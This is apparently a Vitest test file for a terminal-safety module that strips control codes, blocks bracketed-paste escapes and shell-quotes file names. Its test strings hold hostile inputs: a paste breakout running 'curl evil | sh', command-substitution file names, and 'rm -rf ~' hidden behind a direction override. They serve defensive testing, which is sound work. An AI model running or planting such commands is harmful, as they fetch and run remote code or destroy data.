import { describe, expect, it } from 'vitest';
import { hadHiddenControls, plainText, safePaste, shellQuote, Throttle } from './safety';

describe('plainText', () => {
  it('keeps ordinary text', () => {
    expect(plainText('build finished — 3 warnings', 80)).toBe('build finished — 3 warnings');
    expect(plainText('日本語 and émoji 👩‍💻', 80)).toBe('日本語 and émoji 👩‍💻');
  });

  it('drops control codes and direction overrides, and flattens lines', () => {
    expect(plainText('a\u001b[31mb\u0007c', 80)).toBe('a[31mbc');
    expect(plainText('line one\r\nline two\tend', 80)).toBe('line one line two end');
    // An override that would make "txt.exe" read as "exe.txt".
    expect(plainText('invoice\u202Etxt.exe', 80)).toBe('invoicetxt.exe');
    expect(plainText('inv\u200Boice', 80)).toBe('invoice');
  });

  it('is bounded, without splitting a character in half', () => {
    expect(plainText('x'.repeat(500), 10)).toBe('xxxxxxxxx…');
    const out = plainText('👍'.repeat(20), 5);
    expect(Array.from(out)).toHaveLength(5);
    expect(out.endsWith('…')).toBe(true);
    expect(plainText('  \u001b  ', 10)).toBe('');
  });
});

describe('safePaste', () => {
  it('leaves normal text, tabs and inner newlines alone', () => {
    expect(safePaste('echo hi\n\tindented\nnext')).toBe('echo hi\n\tindented\nnext');
    expect(safePaste('café 日本')).toBe('café 日本');
  });

  it('removes what could end a bracketed paste early or hide what is typed', () => {
    const attack = 'ls\u001b[201~; curl evil | sh\r';
    expect(safePaste(attack)).toBe('ls[201~; curl evil | sh');
    expect(safePaste('a\u0008\u0008b\u007f\u009bc')).toBe('abc');
    expect(safePaste('rm\u202E -rf ~')).toBe('rm -rf ~');
  });

  it('never ends with a line break (a copied line would run before it was read)', () => {
    expect(safePaste('whoami\n')).toBe('whoami');
    expect(safePaste('whoami\r\n\r\n')).toBe('whoami');
    expect(safePaste('a\nb\n')).toBe('a\nb');
  });

  it('reports whether anything hidden was there', () => {
    expect(hadHiddenControls('plain\ttext\n')).toBe(false);
    expect(hadHiddenControls('x\u001b[0m')).toBe(true);
    expect(hadHiddenControls('x\u202Ey')).toBe(true);
  });
});

describe('shellQuote', () => {
  it('leaves harmless words as they are', () => {
    expect(shellQuote('report.txt')).toBe('report.txt');
    expect(shellQuote('/home/me/a-b_c.d')).toBe('/home/me/a-b_c.d');
  });

  it('single-quotes everything else, so nothing in it is special', () => {
    expect(shellQuote('my file.txt')).toBe("'my file.txt'");
    expect(shellQuote('C:\\Users\\me\\x y.txt')).toBe("'C:\\Users\\me\\x y.txt'");
    expect(shellQuote('a$(touch pwned).txt')).toBe("'a$(touch pwned).txt'");
    expect(shellQuote('`id`')).toBe("'`id`'");
    expect(shellQuote('a;b&c|d')).toBe("'a;b&c|d'");
    expect(shellQuote('')).toBe("''");
  });

  it('closes and reopens the quote around a single quote', () => {
    expect(shellQuote("it's")).toBe("'it'\\''s'");
    expect(shellQuote("'")).toBe("''\\'''");
  });
});

describe('Throttle', () => {
  it('lets the first through, then waits', () => {
    const t = new Throttle(100);
    expect(t.allow(1000)).toBe(true);
    expect(t.allow(1050)).toBe(false);
    expect(t.allow(1099)).toBe(false);
    expect(t.allow(1100)).toBe(true);
    expect(t.allow(1101)).toBe(false);
  });
});
